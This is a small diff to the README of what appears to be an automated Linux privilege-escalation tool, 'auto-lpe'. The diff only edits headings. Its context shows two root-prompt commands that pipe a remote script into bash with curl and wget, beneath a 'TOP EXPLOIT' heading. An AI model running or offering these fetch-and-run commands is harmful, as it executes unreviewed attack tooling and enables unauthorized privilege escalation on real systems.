@@ -10,7 +10,7 @@
  </div>
 <br>
 
-<div align="center"><h1>Requirements:</h1></div>
+<div align="center"><h1>Requirements</h1></div>
 
 <samp>
   
@@ -33,9 +33,6 @@ root@127.0.0.1:~# bash -c "$(curl -fsSL https://raw.githubusercontent.com/vlain1
 ```
 root@127.0.0.1:~# bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/vlain1337/auto-lpe/refs/heads/main/autolpe.sh)"
 ```
-
-<div align="center"><h1>Read this</h1></div>
-
 <samp>
 <div align="center"><h1> TOP EXPLOIT</h1></div>
 
